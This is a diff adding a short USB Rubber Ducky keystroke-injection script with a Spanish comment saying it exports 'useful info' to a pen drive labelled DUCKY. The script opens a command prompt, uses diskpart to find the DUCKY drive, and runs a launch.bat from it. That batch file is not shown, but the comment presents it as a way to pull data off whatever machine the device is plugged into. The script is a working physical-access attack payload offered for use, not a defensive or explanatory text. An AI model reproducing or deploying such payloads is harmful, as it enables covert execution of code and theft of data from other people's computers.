@@ -1,0 +1,15 @@
+DEFAULT_DELAY 25
+REM Exporta info util a un pendrive con el nombre adecuado (DUCKY)
+
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 100
+STRING cmd
+DELAY 150
+ENTER
+DELAY 150
+STRING for /f "tokens=3 delims= " %A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%A:)
+ENTER
+STRING %DUCKYdrive%\launch.bat
+ENTER
